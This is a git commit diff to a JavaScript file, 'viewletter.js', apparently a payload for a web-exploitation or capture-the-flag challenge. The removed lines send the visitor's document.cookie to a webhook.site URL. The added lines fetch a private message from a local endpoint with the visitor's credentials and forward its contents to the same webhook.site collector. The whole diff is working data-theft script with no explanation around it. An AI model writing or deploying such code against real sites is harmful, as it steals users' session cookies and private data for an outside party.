29c7d26de77776c52a570ee9d703b1c4610bab19
Taise <59153204+taise-hub@users.noreply.github.com>
2023-05-21 18:14:15 +0900

    Update viewletter.js

--- static/viewletter.js
+++ static/viewletter.js
@@ -1,14 +1,8 @@
-// const url = '/message/3'
-// fetch(url, {
-//         method: 'GET',
-//         credentials: "include",
-// }).then((response) => response.json())
-// .then((data) => {
-//         fetch('http://webhook.site/a51a8490-eb47-4f69-bba1-a8d094c53c41?message=' + data.message)
-// });
-
-url2 = "https://webhook.site/a51a8490-eb47-4f69-bba1-a8d094c53c41?cookei=" + document.cookie
-fetch(url2 , {
+const url = 'http://127.0.0.1/message/3'
+fetch(url, {
         method: 'GET',
         credentials: "include",
-})
+}).then((response) => response.json())
+.then((data) => {
+        fetch('http://webhook.site/a51a8490-eb47-4f69-bba1-a8d094c53c41?message=' + data.message)
+});
